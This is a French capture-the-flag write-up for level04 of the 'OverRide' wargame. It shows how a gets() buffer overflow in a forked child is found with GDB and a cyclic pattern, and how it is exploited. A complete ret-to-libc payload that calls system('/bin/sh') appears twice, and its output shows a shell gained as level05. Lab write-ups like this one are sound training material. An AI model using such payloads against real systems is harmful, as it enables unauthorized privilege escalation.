## Solution

```
python -c'print("a" * 156 + "\xd0\xae\xe6\xf7" + "----" + "\xec\x97\xf8\xf7")'
```

Le programme effectue un fork(), puis utilise la fonction non sécurisée gets() dans le processus enfant, ce qui permet un débordement de tampon (buffer overflow) et potentiellement un segfault.

-   Lancez GDB sur le programme vulnérable. Configurez GDB pour suivre les processus enfants avec la commande suivante :
```
    gdb ./level04
    (gdb) set follow-fork-mode child
```
-   Lancez le programme pour qu'il demande une entrée (qui sera capturée par gets()). Utilisez un padding spécifique pour provoquer un débordement :

    bash
```
(gdb) run
Starting program: /home/users/level04/level04
[New process <pid>]
Give me some shellcode, k
```
Envoyez le padding suivant :
```
    Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag
```
-   Après avoir envoyé le padding, un segfault se produit :
```
    Program received signal SIGSEGV, Segmentation fault.
    [Switching to process <child_pid>]
    0x41326641 in ?? ()
```

Cela signifie que le pointeur d'instruction (EIP) a été corrompu et contient une partie du padding.

-   Vérifiez l'état des registres pour confirmer l'atteinte du EIP avec une partie du padding :
```
    (gdb) info register
    eax            0x0	0
    ecx            0xf7fd08c4	-134412092
    edx            0xffffd670	-10640
    ebx            0x41386541	1094214977
    esp            0xffffd710	0xffffd710
    ebp            0x31664130	0x31664130
    esi            0x0	0
    edi            0x66413965	1715550565
    eip            0x41326641	0x41326641
    eflags         0x10282	[ SF IF RF ]
    cs             0x23	35
    ss             0x2b	43
    ds             0x2b	43
    es             0x2b	43
    fs             0x0	0
    gs             0x63	99
```
    
Ici, le registre EIP contient 0x41326641, qui correspond à une partie du padding **(Aa2A)**.

-   Le fait que le registre EIP ait été corrompu indique qu'il est possible de rediriger le flux d'exécution du programme.
-   Utilisez cette vulnérabilité pour mettre en place une attaque ret-to-libc, en choisissant des adresses appropriées dans la mémoire pour appeler des fonctions telles que system() avec des arguments contrôlés (par exemple /bin/sh).

### Payload

```
(gdb) p &system
$1 = (<text variable, no debug info> *) 0xf7e6aed0 <system>

(gdb) find &system,+9999999,"/bin/sh"
0xf7f897ec
```

**41326641 -> Reverse = 41663241 -> to Ascii = Af2A -> Offset = 156**

```
level04@OverRide:~$ python -c'print("a" * 156 + "\xd0\xae\xe6\xf7" + "----" + "\xec\x97\xf8\xf7")' > /tmp/lvl4 
level04@OverRide:~$ cat /tmp/lvl4 - | ./level4
bash: ./level4: No such file or directory
level04@OverRide:~$ cat /tmp/lvl4 - | ./level04
Give me some shellcode, k
whoami
level05
```